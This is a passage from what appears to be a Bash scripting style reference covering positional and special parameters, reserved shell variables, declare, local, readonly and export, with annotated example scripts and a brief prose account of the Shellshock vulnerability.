  `BASH_ARGV0` is assigned, `$0` reflects the new value.
- `$1` … `$9` — the first nine positionals, accessible without braces.
- `${10}`, `${11}`, … — beyond nine, **braces are required**: `$10`
  parses as `$1` followed by the literal `0`.
- `$#` — count of positionals currently in scope (script, function, or
  `set --` block).
- `set -- a b c` — explicit assignment. `set --` with no further
  arguments clears all positionals.
- `shift [N]` — discards the first `N` (default `1`) positionals and
  renumbers the remainder. Under `shopt -s shift_verbose`, shifting more
  than `$#` is a visible error rather than a silent no-op.

### `"$@"` versus `"$*"` — the load-bearing distinction

Both expand to all positionals, but the quoted forms behave very
differently:

- `"$@"` expands to **N separate words**, one per positional, with
  internal whitespace and globbing characters preserved verbatim.
- `"$*"` expands to **a single word**, the positionals joined by the
  first character of `IFS` (space by default).

Unquoted `$@` and `$*` are essentially never what you want — both
re-split each element on `IFS` and apply pathname expansion. The only
correct forwarding idiom is `"$@"`.

```bash
# scenario: forwarding arguments correctly versus collapsing them
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

show() {
  printf 'count=%d\n' "$#"
  local -i i=1
  for arg in "$@"; do
    printf '  [%d]=<%s>\n' "$i" "$arg"
    i+=1
  done
}

set -- 'first arg' 'second arg' 'third'

printf '== "$@" preserves words ==\n'
show "$@"
# ⇒ count=3, three discrete entries with internal spaces intact

printf '== "$*" collapses to one word ==\n'
show "$*"
# ⇒ count=1, the entry is "first arg second arg third"

# wrong — unquoted $@ re-splits on IFS; demo only
printf '== unquoted $@ re-splits on IFS ==\n'
#shellcheck disable=SC2068
show $@
# ⇒ count=5: "first", "arg", "second", "arg", "third"
```

The collapsing form `"$*"` has narrow legitimate uses — joining
positionals into a log line, building a single shell-quoted string for
display — but for **forwarding** arguments to another command, the only
correct form is `"$@"`.

### Function positionals shadow the script's

When a function is called, its arguments become the active `$1`, `$2`,
…; the script's positionals are inaccessible from inside the function
unless explicitly captured. `return` restores the caller's positional
set.

```bash
greet() {
  printf 'function sees: %d args, first=<%s>\n' "$#" "${1-}"
}

set -- alpha beta gamma
greet one two
# ⇒ function sees: 2 args, first=<one>
# script's $1 is still "alpha" after greet returns
printf 'script sees: %s\n' "$1"
```

The `${1-}` form (with a default) is needed under `set -u` whenever a
positional may legitimately be unset — bare `$1` would abort the script.

### Consuming options with `getopts`

`getopts` walks the positionals one option at a time, populating
`$OPTARG` and `$OPTIND`. After the loop, `shift "$((OPTIND - 1))"`
discards the consumed options, leaving the non-option arguments as the
new `$1`, `$2`, …

```bash
# scenario: getopts consumes options, leaving file arguments
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

set -- -v -o out.log a.txt b.txt   # demo invocation: ./script -v -o out.log …

verbose=0 output=''
while getopts ':vo:' opt; do
  case $opt in
    v)  verbose=1 ;;
    o)  output=$OPTARG ;;
    \?) printf 'unknown: -%s\n' "$OPTARG" >&2; exit 2 ;;
    :)  printf 'missing arg: -%s\n' "$OPTARG" >&2; exit 2 ;;
  esac
done
shift "$((OPTIND - 1))"

printf 'verbose=%d output=<%s>\n' "$verbose" "$output"
# ⇒ verbose=1 output=<out.log>
printf 'remaining files: %d\n' "$#"
# ⇒ remaining files: 2
for f in "$@"; do printf '  %s\n' "$f"; done
# ⇒ a.txt
# ⇒ b.txt
```

`getopts` only handles short options (`-v`, `-o arg`, bundled `-vo
arg`); for long options, hand-write the loop or use a dedicated
parser — see §6.4 for the BCS pattern.

### Common pitfalls

- `[[ -z $1 ]]` aborts under `set -u` if `$1` is unset; use `[[ -z
  ${1-} ]]`.
- `for x in $@; do …` is wrong twice over — unquoted, and missing the
  `"$@"` discipline. Always write `for x in "$@"; do …`.
- `shift; shift; shift` is fragile; prefer `shift 3`, or use
  `shift_verbose` and consume options through `getopts`.

### See also

- §4.3 — special parameters (`$#`, `$@`, `$*`, `$?`, …)
- §6.4 — option-parsing patterns and `getopts` idioms
- §4.13 — assignment-prefixed commands and positional inheritance
- BCS0202 (variable scoping), BCS0301 (quoting fundamentals)

## 4.3 Special parameters

Single-character parameters with fixed semantics, set by Bash itself
and never assigned by the script. They are read-only inputs; treat any
attempt to reassign one (e.g. `$?=0`) as a bug. The complete reference
is in **Appendix B**; this chapter is the cheatsheet readers consult
in practice.

### The cheatsheet

| Param | Holds | Set by | Typical example |
|-------|-------|--------|-----------------|
| `$?`  | exit status of last *foreground* command (0–255) | every simple command and pipeline | `cmd; rc=$?` |
| `$$`  | PID of the script (fixed at script start; **not** subshell PID) | shell startup | `lockfile=/tmp/run.$$` |
| `$!`  | PID of the most recent backgrounded process | each `&` launch | `cmd & wait "$!"` |
| `$_`  | last argument of the previous command (interactive: also script name on entry) | every simple command | `mkdir new && cd "$_"` |
| `$-`  | option flags currently in effect (e.g. `himBHs`, `ehuxB`) | shell startup, `set` | `[[ $- == *e* ]] && echo errexit-on` |
| `$0`  | argument zero — script name as invoked | shell startup, `BASH_ARGV0=` | `printf 'usage: %s …\n' "$0"` |

### Worked examples

```bash
# scenario: cheatsheet — print every special parameter with sample values
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# $$ — script PID, captured once at top of script
declare -ri SCRIPT_PID=$$
declare -r  TMPDIR_RUN="/tmp/run.$SCRIPT_PID"

# $- — current option flags (membership test, not equality)
[[ $- == *e* ]] && printf 'errexit on\n'

# $? — exit status of last command (BCS0602)
true;  printf 'rc=%d\n' "$?"   # ⇒ rc=0
# Capture into a typed local on the very next line — anything in
# between rewrites $?:
false || true; declare -i rc_demo=$?
printf 'rc_demo=%d\n' "$rc_demo"

# $! — most recent background PID
sleep 0.1 &
declare -ri BGPID=$!
wait "$BGPID"

# $_ — last word of previous command (volatile)
mkdir -p "$TMPDIR_RUN" && printf 'made %s\n' "$_"
# ⇒ made /tmp/run.
# (the path ends with the captured SCRIPT_PID — runtime-dependent)

# $0 — script name; matters for usage/help output (BCS0704)
printf 'usage: %s [-h] FILE\n' "${0##*/}"
```

### Subtleties to remember

- **`$?` is fragile**. It is overwritten by every command — even
  diagnostics. Capture into a named variable on the very next line:
  `cmd; local -i rc=$?`. Prefer `if cmd; then …` whenever the boolean
  form suffices (BCS0501, BCS0604).
- **`$$` does not change in subshells**. The PID of the running *child*
  is `$BASHPID` (a separate Bash variable, see Appendix C). Scripts
  that lockfile by `$$` from inside a subshell get the *parent's* PID.
- **`$!` is per-shell, not per-job**. Save it immediately after `&`;
  the next `&` overwrites it. For multiple jobs use an array:
  `pids+=("$!")`, then `wait "${pids[@]}"` (BCS1101, §16.4).
- **`$_` is volatile**. Don't rely on it past the very next line —
  prefer named variables.
- **`$-` is membership-tested**, never compared for equality. The
  flag string varies with which options are on (`set -o`).
- **`$0` may be reassigned** since Bash 5.0 via `BASH_ARGV0=`. Inside
  a function, `$0` is still the script, not the function — use
  `${FUNCNAME[0]}` for that (§4.4).

### BCS posture

- Quote special parameters in word context: `"${1:-}"`. Inside `[[ ]]`
  or `(( ))` quoting is unnecessary (BCS0301, BCS0303).
- Capture `$?` into a typed local **immediately** — `declare -i rc=$?`
  (BCS0201, BCS0604). Do not chain diagnostics between the failing
  command and the capture.

**See also**: §4.2 (positional `$0`/`$#`), §4.4 (`BASHPID`,
`FUNCNAME`), §13.10 (exit code conventions), Appendix B (full reference).

## 4.4 Shell variables

Bash maintains a long list of reserved variable names with specific
semantics. This chapter is the canonical taxonomy; the full alphabetical
list with type and lifecycle is in Appendix C. The grouping below is
the conceptual map a script author needs in order to know **which**
variable to reach for and **why** it exists — even if the exact value
must be looked up elsewhere.

### Identity and version

- `BASH` — absolute path to the running `bash` binary.
- `BASH_VERSION` — full version string, e.g. `5.2.21(1)-release`.
- `BASH_VERSINFO[]` — six-element array: major, minor, patch, build,
  release, machine. Use this for programmatic version checks; never
  parse `BASH_VERSION` with regex.
- `BASHPID` — the running process's PID. Distinct from `$$`, which
  *never* changes within a script even inside subshells. Use `BASHPID`
  whenever you need the actual current PID.
- `UID`, `EUID`, `GROUPS[]` — real user id, effective user id (after
  `setuid`), supplementary groups.

### Call-stack introspection

These three arrays are parallel: index *i* of one corresponds to index
*i* of the others.

- `BASH_SOURCE[]` — the file each frame was sourced from.
  `${BASH_SOURCE[0]}` is the current file; `${BASH_SOURCE[-1]}` the
  outermost script.
- `FUNCNAME[]` — the function-name stack. `${FUNCNAME[0]}` is the
  current function; outside a function the array is empty.
- `BASH_LINENO[]` — line number at which each frame **called** the
  next. `${BASH_LINENO[0]}` is the line that called the current
  function.
- `BASH_ARGV[]`, `BASH_ARGC[]` — the argument history of every function
  call, populated only when `shopt -s extdebug` is active.

```bash
# scenario: a stack-trace helper for use inside an ERR or EXIT trap
trace() {
  local -i i frames=${#FUNCNAME[@]}
  for ((i=1; i<frames; i++)); do
    printf '  at %s (%s:%d)\n' \
      "${FUNCNAME[i]}" \
      "${BASH_SOURCE[i]}" \
      "${BASH_LINENO[i-1]}"
  done
} >&2

inner() { trace; }
outer() { inner; }
outer 2>&1   # merge stderr into stdout so the trace lines are captured
# ⇒ at inner
# ⇒ at outer
# (line numbers vary; the trace lists each calling frame in order)
```

### Pipeline and regex state

- `PIPESTATUS[]` — exit codes of every stage of the last pipeline.
  Indispensable when `set -o pipefail` is on but you still need to know
  *which* stage failed. The array is overwritten by the next pipeline,
  so capture it immediately.
- `BASH_REMATCH[]` — submatches from the most recent `=~` match.
  Element 0 is the whole match; elements 1+ are the parenthesised
  groups.

```bash
# scenario: capture pipeline failure point and regex submatches
grep -E '^v[0-9]' tags.txt | sort -V | tail -1
declare -ra status=("${PIPESTATUS[@]}")
((status[0] == 0)) || printf 'grep failed (rc=%d)\n' "${status[0]}" >&2

if [[ "v1.2.3-rc4" =~ ^v([0-9]+)\.([0-9]+)\.([0-9]+)(-([a-z0-9]+))?$ ]]; then
  printf 'major=%s minor=%s patch=%s pre=%s\n' \
    "${BASH_REMATCH[1]}" "${BASH_REMATCH[2]}" \
    "${BASH_REMATCH[3]}" "${BASH_REMATCH[5]:-}"
fi
# ⇒ major=1 minor=2 patch=3 pre=rc4
```

### Runtime values

- `LINENO` — line number of the next command to be executed.
- `SECONDS` — integer seconds since shell start; assignable to reset.
- `EPOCHSECONDS` — current Unix time in seconds (Bash 5.0+).
- `EPOCHREALTIME` — Unix time with microsecond precision (Bash 5.0+).
- `RANDOM` — pseudo-random 0–32767 each access; not cryptographic.
- `SRANDOM` — uniformly distributed 32-bit value (Bash 5.1+); use this
  for any randomness that matters.
- `BASH_SUBSHELL` — depth of the current subshell nesting; `0` at the
  top level.

### Shell-state introspection

- `SHELLOPTS` — colon-joined list of `set -o` options currently on.
- `BASHOPTS` — colon-joined list of `shopt -s` options currently on.
- `BASH_EXECUTION_STRING` — string passed via `bash -c "…"`, empty
  otherwise.

### Locale and I/O

- `LANG`, `LC_ALL`, `LC_CTYPE`, `LC_COLLATE`, `LC_MESSAGES`,
  `LC_NUMERIC`, `LANGUAGE` — locale settings. Set `LC_ALL=C` for
  deterministic byte-level sorting and pattern matching.
- `IFS` — internal field separator. Default is space-tab-newline; many
  bugs come from accidental modification.
- `PWD`, `OLDPWD` — current directory and the previous one (for `cd
  -`).

### Prompts and interactive context

- `PS0` — printed after a command is read but before it executes.
- `PS1` — primary prompt.
- `PS2` — secondary prompt (continuation lines).
- `PS3` — `select` prompt.
- `PS4` — prefix for `set -x` trace lines (default `+ `).
  See §18.13 for prompt-expansion sequences.

### Completion and readline

- `COMP_WORDS[]`, `COMP_CWORD`, `COMP_LINE`, `COMP_POINT`, `COMPREPLY[]`
  — programmable-completion context (set only inside `complete -F`
  callbacks).
- `READLINE_LINE`, `READLINE_POINT` — content and cursor position
  available inside `bind -x`.
- `MAPFILE` — the default array name used by `mapfile`/`readarray` when
  no array is named (§14.3).

### History

- `HISTFILE`, `HISTSIZE`, `HISTFILESIZE`, `HISTCONTROL`, `HISTIGNORE`,
  `HISTTIMEFORMAT` — history configuration; relevant in interactive
  shells, ignored in non-interactive script mode.

### Process and job context

- `$$` — the **shell's** PID at startup. Constant for the lifetime of
  the script and **identical** in every subshell — this is the
  property that distinguishes it from `BASHPID`.
- `$!` — PID of the most recently backgrounded asynchronous command.
- `$?` — exit status of the most recent foreground pipeline.
- `$_` — last argument of the previous simple command.
- `PPID` — parent process's PID; constant for the script's lifetime.

### Useful at debugging time

- `LINENO` is most useful inside `PS4` for `set -x` traces:
  `PS4='+ ${BASH_SOURCE}:${LINENO}: '` produces a trace that names the
  file and line at every step.
- `FUNCNEST` — maximum function-call recursion depth before bash
  aborts; `0` (default) means no limit.
- `SHLVL` — incremented by 1 in each child shell; useful for spotting
  unexpectedly nested `bash -c` invocations.

```bash
# scenario: a debug-friendly PS4 for set -x
PS4='+ ${BASH_SOURCE##*/}:${LINENO} ${FUNCNAME[0]:-MAIN}() '
set -x
greet() { printf 'hi\n'; }
greet
# trace shows: + script.bash:42 greet() printf 'hi\n'
```

### Conventions

Bash's reserved names are upper-case; user globals should also be
upper-case but **never collide with these reserved names**. A common
defensive practice is to prefix project globals (`MYAPP_PATH` rather
than `PATH`) — see BCS0203 for naming conventions and BCS0204 for
the constants/environment split.

### Read-only and system-imposed names

A handful of reserved names are **read-only** and cannot be assigned:
`UID`, `EUID`, `PPID`, `BASHPID`, `BASH_VERSINFO[]`, `EPOCHSECONDS`,
`EPOCHREALTIME`, `LINENO`, `RANDOM` (each access reseeds), `SECONDS`
(assigning resets the counter, not changes its rules), `SHELLOPTS`,
`BASHOPTS`. Attempting to assign produces an error under `set -e` /
strict mode.

### See also

- Appendix C — full alphabetical reserved-variable index with types
- §4.5 — `declare` and how attributes interact with reserved names
- §14.3 — `mapfile` / `readarray` and `MAPFILE`
- §18.13 — prompt-string expansion
- BCS0203 (naming conventions), BCS0204 (constants/environment)

## 4.5 The `declare` builtin and attributes

Every Bash variable carries a set of *attributes* — a small fixed bag
of flags that determine its type, scope, mutability, and export status.
`declare` (alias `typeset`) sets those attributes; `local`, `readonly`,
`export`, and `nameref` are conventional spellings of common
combinations. Attributes are the only static type system Bash has, and
the BCS rule is to use them everywhere a variable is introduced.

### Attribute reference

| Flag | Meaning | Mutual exclusion |
|------|---------|------------------|
| `--` | Terminate option processing; declare with no extra attribute (just a string) | — |
| `-i` | Integer; assignments are evaluated as arithmetic | excludes `-a`/`-A` value semantics on RHS |
| `-a` | Indexed array | mutually exclusive with `-A` |
| `-A` | Associative array | mutually exclusive with `-a` |
| `-r` | Readonly (immutable thereafter) | applies on top of any other attribute |
| `-x` | Export to the environment of children | applies on top of any other attribute |
| `-l` | Convert value to lowercase on assignment | mutually exclusive with `-u` |
| `-u` | Convert value to uppercase on assignment | mutually exclusive with `-l` |
| `-n` | Nameref — value is the *name* of another variable (§4.11) | replaces other type flags on the ref itself |
| `-t` | Function trace flag (only meaningful for functions) | — |
| `-g` | Declare a *global* from inside a function | combine with any type flag |
| `-p` | Print declarations (introspection only) | not a type flag |
| `-f`, `-F` | Operate on functions (`-f` body, `-F` name only) | not type flags for variables |

`declare +X` removes attribute `X`. The `+` form cannot remove `-r`:
once readonly, always readonly until process exit.

### Worked examples

```bash
# scenario: integer attribute makes RHS arithmetic
declare -i count=0
count='2 + 3'           # ⇒ count=5  (arithmetic context applied)
count=0xff              # ⇒ count=255
count='abc'             # ⇒ count=0  (non-numeric reduces to 0)

declare -p count        # ⇒ declare -i count="0"
```

The `-i` attribute makes assignments **silent arithmetic** — usually
desired for counters, occasionally surprising when a string sneaks
through. Pair with `set -u` and explicit defaults; never feed
user-controlled data into an `-i` variable without validation.

```bash
# scenario: indexed and associative arrays
declare -a words=(alpha beta gamma)
words+=(delta)
declare -p words
# ⇒ declare -a words=([0]="alpha" [1]="beta" [2]="gamma" [3]="delta")

declare -A by_id=([alice]=42 [bob]=17)
by_id[carol]=99
declare -p by_id
# ⇒ declare -A by_id=(
# (key order is hash-dependent; expect `[alice]="42" [bob]="17" [carol]="99"`
#  in some order, with each value double-quoted)
```

The associative array **must** be declared before first use — there is
no implicit conversion; assigning to an undeclared name creates an
indexed array with index `0`, silently masking the bug.

```bash
# scenario: combining attributes — the BCS idiom for a readonly array
declare -ar VALID_TIERS=(core recommended style disabled)

# scenario: nameref for output parameters
get_user() {
  local -n out=$1
  out='alice'
}
declare -- name=''
get_user name
printf '%s\n' "$name"   # ⇒ alice

# scenario: explicit export
declare -x PATH="/usr/local/bin:$PATH"
declare -rx FROZEN_VERSION='1.0.0'   # readonly + exported in one statement
```

### Combining attributes — order and precedence

- `-r` and `-x` *stack* on top of any type flag: `declare -ax CFG=(…)`
  exports an indexed array to children; `declare -ir N=42` is a
  readonly integer.
- `-l`/`-u` apply on assignment, after expansion. They affect the
  stored value, not just display.
- `-i` overrides RHS interpretation: `declare -i x='2+3'` stores `5`,
  not the string `2+3`.
- `-n` is **special**: it makes the variable a reference. Combining
  `-n` with `-i` or `-a` is meaningless — the type comes from the
  *target*. Always declare the nameref alone: `local -n ref=$1`.

### `-g` — declaring a global from inside a function

By default a `declare` inside a function creates a *local*. The `-g`
flag forces a global declaration with the given attributes — useful
for one-time initialisation routines.

```bash
init_cache() {
  declare -gA CACHE=()        # global associative array
  declare -gi CACHE_HITS=0    # global integer counter
}
init_cache
CACHE[key]=value              # accessible at script scope
```

### Pitfalls

- **Assigning to an undeclared associative array** silently creates an
  *indexed* array.
  ```bash
  # wrong
  m[alice]=42                 # creates indexed array; 'alice' evaluates to 0
  # right
  declare -A m=([alice]=42)
  ```
- **Removing attributes** with `+`: `declare +i x` removes `-i` but
  cannot remove `-r`. There is no `+r`.
- **`declare` inside a function without `-g`** is local even when the
  variable name was previously a global — you have shadowed the
  global.
- **Spaces are forbidden** around `=` in any declaration:
  `declare x = 1` is parsed as the command `declare` with three
  operands.
- **Attribute persistence on append**: `arr+=( … )` preserves
  attributes; `arr=( … )` does **not** clear them. Once an array is
  associative, it stays associative until `unset`.

### Introspection: `declare -p`

`declare -p name` prints a re-loadable declaration of `name`, including
its attributes. `declare -p` with no name lists every variable.
Combining with `grep`/`compgen` is the standard debugging technique
when a value is "wrong" — print the declaration to see the attribute
set.

```bash
# scenario: introspecting attributes during debugging
declare -ir MAX=100
declare -ax PATHS=(/usr/bin /bin)
declare -A MAP=([a]=1 [b]=2)

declare -p MAX PATHS MAP
# ⇒ declare -ir MAX="100"
# ⇒ declare -ax PATHS=([0]="/usr/bin" [1]="/bin")
# ⇒ declare -A MAP=
# (associative-array key order is hash-dependent; both `[a]="1"` and
#  `[b]="2"` will appear, in some order)

# Filter all readonly variables visible to the script:
declare -p | grep -E '^declare -[^ ]*r '
```

`declare -F` lists *all* defined function names; `declare -F name`
prints just one; `declare -f name` prints the function body. Together
with `compgen -A function` they cover every common discovery use.

### Explicit attributes on `local`

Always declare locals with their intended attribute. Bare `local name`
behaviour around attribute inheritance has shifted across bash
versions; the explicit forms below remove that ambiguity entirely:

```bash
# scenario: explicit -i locals vs string-typed locals
declare -i counter=0          # integer at script scope

increment_int() {
  local -i counter            # explicit integer attribute
  counter='2 + 3'             # → arithmetic context: 5
  printf '%d\n' "$counter"    # ⇒ 5
}

increment_string() {
  local -- counter            # explicit string; arithmetic does not apply
  counter='2 + 3'
  printf '%s\n' "$counter"    # ⇒ 2 + 3
}

increment_int       # ⇒ 5
increment_string    # ⇒ 2 + 3
```

In bash 5.2, a bare `local name` (no attribute flag) does *not* reliably
inherit attributes from a same-named global; explicit `local --` for
strings and `local -i`/`local -a`/`local -A` for typed locals is the
unambiguous form that survives both attribute-inheritance changes
between bash versions and the BCS option-termination rule. See
BCS0202.

The `local --`/`local -i`/`local -a` forms are the BCS standard
precisely because they sever any attribute-inheritance dependency on
the global namespace.

### See also

- §4.6 — `local` (a function-scoped `declare`)
- §4.7 — `readonly` (the `-r` attribute alone)
- §4.8 — `export` (the `-x` attribute alone)
- §4.9, §4.10 — array creation and indexing details
- §4.11 — namerefs and the `-n` attribute in depth
- BCS0201 (type-specific declarations), BCS0202 (variable scoping)

## 4.6 `local` and dynamic scope

`local` declares a variable whose lifetime ends when the enclosing
function returns. Bash's scope is **dynamic**, not lexical: a function
can see locals declared by **any function above it on the call stack**.
This is the property most likely to surprise a programmer arriving from
C, Python, JavaScript, or any other language with lexical scope.

### Syntax — always `local --`

```bash
# right — terminate option processing first
my_function_right() {
  local -- name=$1
  local -i count=0
  local -a items=()
  printf 'right: name=%s count=%d items=%d\n' "$name" "$count" "${#items[@]}"
}

# wrong — caller-supplied name without `--` reaches `local` as an option
my_function_wrong() {
  local "$1" 2>&1 || true            # `local --help` → builtin help, not assign
}

my_function_right alpha          # ⇒ right: name=alpha count=0 items=0
my_function_wrong --help         # → triggers the local-option-parse footgun
```

The BCS rule is: **always begin a `local` declaration with an attribute
flag** (`local --`, `local -i`, `local -a`, `local -A`, `local -n`).
This terminates option processing before the variable name and prevents
values like `--help` or `-x` from being interpreted as flags. See
BCS0201 and BCS0202.

`local` accepts the same attribute flags as `declare`: `-i` integer,
`-a` indexed array, `-A` associative, `-r` readonly, `-n` nameref.
`local -p` prints declarations of all current locals — a debugging aid
inside complex functions.

### Dynamic scope — the visibility chain

Locals declared in a caller are visible to **every callee**, transitively,
until the caller returns. There is no "encapsulation" — a deeply nested
helper can read (and modify) any local of any function on the stack.

```bash
# scenario: dynamic scope visibility
top() {
  local -- secret='from top'
  middle
}

middle() {
  # No 'secret' declared here — but $secret is visible
  printf 'middle sees: %s\n' "$secret"
  bottom
}

bottom() {
  # Still visible, two frames down
  printf 'bottom sees: %s\n' "$secret"
  secret='mutated by bottom'   # writes back to top's local!
}

top
# ⇒ middle sees: from top
# ⇒ bottom sees: from top
# After top() returns, $secret is unset again at script scope.
```

Two consequences worth pinning down:

1. **A callee shadows a caller's local with `local`**, not by plain
   assignment. Inside `bottom`, `local -- secret='x'` would create a
   new local hiding `top`'s; bare `secret='x'` writes through to
   `top`'s.
2. **A function relying on a caller's local is fragile**. The
   convention is to pass values explicitly via positionals or, for
   output parameters, via namerefs (§4.11) — never to depend on an
   ambient name.

### Locals shadow globals

A `local name=…` inside a function hides any global of the same name
for the duration of the call. Callees see the local; the global
re-emerges after return.

```bash
# scenario: function-local shadows a global
declare -- mode='production'

run() {
  local -- mode='test'
  helper
}

helper() {
  printf 'helper mode: %s\n' "$mode"
}

helper             # ⇒ helper mode: production  (sees global)
run                # ⇒ helper mode: test        (sees run's local)
helper             # ⇒ helper mode: production  (back to global)
```

### Interaction with namerefs

`local -n ref=name` creates a function-scoped reference to `name`. The
reference itself is local; the *target* lives wherever it was declared.
Once the function returns, the nameref is destroyed — the target is
unaffected. The shadowing pitfall — naming the nameref the same as its
target — is detailed in §4.11.

### Declaring typed locals

Use the strongest typed declaration available; it documents intent and
catches mistakes early.

```bash
process() {
  local -- file=$1            # explicit string
  local -i count=0            # integer counter
  local -a errors=()          # indexed array
  local -A by_key=()          # associative array
  local -ar tiers=(a b c)     # readonly array
  local -n out=$2             # output parameter (nameref)
}
```

### When *not* to use `local`

- At script scope (outside any function) — `local` is invalid there;
  use `declare`.
- For values you intentionally want visible to callees — but this is
  fragile design; prefer explicit parameters.
- For constants — use `local -r` (function-scoped) or `readonly`/`-r`
  at script scope.

### See also

- §4.5 — `declare` and the full attribute set
- §4.7 — `readonly` and immutability
- §4.11 — namerefs and the output-parameter idiom
- §4.13 — variable assignment semantics
- BCS0201 (type-specific declarations), BCS0202 (variable scoping)

## 4.7 `readonly` and immutability

A variable marked `readonly` (equivalently `declare -r`) cannot be
reassigned, unset, or have any attribute revoked. Bash enforces this
in the parser/runtime: an attempt to write to a readonly name fails
with a diagnostic and exits non-zero — under `set -e` the whole script
terminates. The attribute is **one-way**: once set, the only way to
clear it is to leave the shell.

### Surface area

- `readonly name=value` and `declare -r name=value` are equivalent.
- `readonly -p` lists all readonly variables in re-source-able form.
- `readonly -f funcname` marks a function definition immutable; it
  cannot be redefined or `unset -f`.
- Combined attributes are common: `declare -ir COUNT=0` (integer +
  readonly), `declare -ar PARTS=(a b c)` (indexed array + readonly),
  `declare -Ar MAP=([k]=v)` (assoc + readonly).
- The order of attributes matters only at *assignment* — once the
  readonly bit is set, no further `declare`/`local` can change other
  attributes either.

### Script metadata — the canonical use case

Every BCS-compliant script declares its identity as readonly at the
top, immediately after strict-mode setup (BCS0103):

```bash
# scenario: BCS metadata block — every script begins this way
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r  VERSION='1.2.3'
#shellcheck disable=SC2155
declare -r  SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
declare -r  SCRIPT_DIR=${SCRIPT_PATH%/*}
declare -r  SCRIPT_NAME=${SCRIPT_PATH##*/}
declare -r  PREFIX=${SCRIPT_DIR%/bin}

# Trying to reassign trips the immutability guard:
SCRIPT_NAME='oops'
# ⇒ bash: SCRIPT_NAME: readonly variable
# ⇒ (under `set -e`, script terminates with non-zero status)
```

`realpath` (not `readlink`) is the canonical resolver for BCS scripts
(BCS0103). The `${...%/*}` / `${...##*/}` trims avoid forking
`dirname`/`basename` (§5.4).

### Read-only functions

`readonly -f` freezes a function's definition for the lifetime of the
shell. Useful for libraries that supply utility functions which
callers must not silently shadow:

```bash
# scenario: lock down a library helper so a downstream caller cannot redefine it
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

die() {
  printf '%s: %s\n' "${0##*/}" "$*" >&2
  exit 1
}
readonly -f die

# A later (mistaken) redefinition is rejected:
die() { echo 'pwned'; }
# ⇒ bash: die: readonly function
```

### Pitfalls

- **In-function readonly persists after return**. `readonly` always
  affects the global slot unless used together with `local -r` (which
  itself implies the local scope but the readonly bit is still
  irrevocable for the duration of the function and its callees).
  Library functions that mark a global as readonly can subtly poison
  every later script that sources them.
- **Re-sourcing a script that declares readonly globals fails**: the
  second source attempts to reassign already-frozen names. Idempotent
  libraries gate the declarations behind a guard (§10.4).
- **`unset` on a readonly variable errors**. There is no `--force`.
  Restart the shell.
- **Arrays**: an `-ar` array allows neither element addition nor
  removal — `arr+=(x)` and `unset 'arr[0]'` both fail.

### BCS posture

- All script metadata is `declare -r` (BCS0103, BCS0205).
- Constants the script relies on for behaviour (paths, defaults that
  must not change) are `declare -r` (BCS0204).
- `readonly -f` for any library function whose contract callers must
  not redefine.
- Avoid marking *configuration* readonly until config-file sourcing
  has completed (BCS0111) — you cannot revoke immutability later.

**See also**: §4.5 (`declare` and attributes), §4.6 (`local --`),
§4.14 (`unset` and the readonly bar), §10.4 (idempotent sourcing).

## 4.8 `export` and the environment

`export` marks a shell variable so that its name and value are passed
into the environment of every subsequently-spawned child process. The
exported state is a per-variable attribute (the `-x` flag in `declare`
terms), not a separate namespace: an exported variable is still a
shell variable, simply one that crosses the `fork+exec` boundary.

### Forms

- `export name=value` — assignment plus export in one statement.
- `declare -x name=value` — equivalent; useful when combining with
  other attributes (`declare -rx FROZEN=…`).
- `export name` — mark an existing variable as exported without
  changing its value.
- `export -p` — print all exported variables in re-loadable form.
- `export -n name` — remove the export attribute. The variable
  remains as a shell variable; only the inheritance flag is cleared.
- `export -f funcname` — export a function (see *Function export and
  Shellshock* below).

### Inheritance is one-way

A child process receives a **copy** of the environment at exec time.
Modifications inside the child do not propagate back. Subshells
(parenthesised groups, `$( )`, pipelines) inherit by reference *for
read* but copy-on-write for any modification — once the subshell
mutates a variable, the parent's binding is unchanged.

```bash
# scenario: child sees the parent's export, mutations stay in the child
export GREETING='hello'

bash -c 'printf "child sees: %s\n" "$GREETING"; GREETING=mutated'
# ⇒ child sees: hello

printf 'parent still: %s\n' "$GREETING"
# ⇒ parent still: hello
```

### Assignment-prefixed commands

A command preceded by one or more `name=value` assignments inherits
those bindings as exports **for the duration of that command only**.
The shell variable in the parent is *not* modified.

```bash
# scenario: temporary export for one command
unset LANG          # remove from current shell

LANG=C sort < input.txt > sorted.txt
# ⇒ sort sees LANG=C; the parent's LANG remains unset afterwards

printf 'parent LANG: <%s>\n' "${LANG-unset}"
# ⇒ parent LANG: <unset>
```

The exception: when the command is a *special builtin* (`:`, `.`,
`break`, `continue`, `eval`, `exec`, `exit`, `export`, `readonly`,
`return`, `set`, `shift`, `times`, `trap`, `unset`), the assignment
persists in the *current* shell. Avoid this corner — under strict-mode
scripting, prefer an explicit `export`/`declare` statement to anything
that could reach a special builtin.

### What is and is not exported by default

Bash inherits whatever the parent shell exports. On a typical login
shell that includes:

- `PATH`, `HOME`, `USER`, `SHELL`, `TERM` — set by the login process
- `LANG`, `LC_*` — locale settings
- `PWD`, `OLDPWD` — Bash maintains these and exports them
- `EDITOR`, `PAGER`, `LESS`, etc. — user-set in `~/.bashrc` or
  `~/.profile`

A new variable created in a script is **not** exported unless you say
so. This is the right default — exported state pollutes every child
and can break tools that expect a clean environment.

### Function export and Shellshock

`export -f funcname` puts a function definition into the environment,
encoded as a string. Bash 4.2 and earlier encoded this as a literal
function body assigned to a specially-named variable; the child shell
parsed and re-executed that body during startup. The infamous
**CVE-2014-6271 ("Shellshock")** exploited a flaw whereby Bash kept
parsing trailing commands after the function body, allowing remote
code execution through any path that fed user input into the
environment of a Bash subshell — notably CGI scripts.

Bash 4.3+ encodes exported functions with a separate prefix
(`BASH_FUNC_name%%`) and the parser stops at the function body.
Modern Bash is safe, but the larger lesson stands:

- **Exported functions are not portable** across shells. A child `sh`
  process will not pick them up.
- **They are a debugging trap** — the function appears in `env` output
  and can shadow the same name in the child.
- **Avoid `export -f` in production scripts.** Prefer dotting-in a
  library file in the child, or passing logic via `bash -c "$(declare
  -f fn); fn args"` — explicit and visible.

```bash
# scenario: function export — works, but rarely the right tool
greet() { printf 'hello, %s\n' "${1-world}"; }
export -f greet

bash -c 'greet alice'
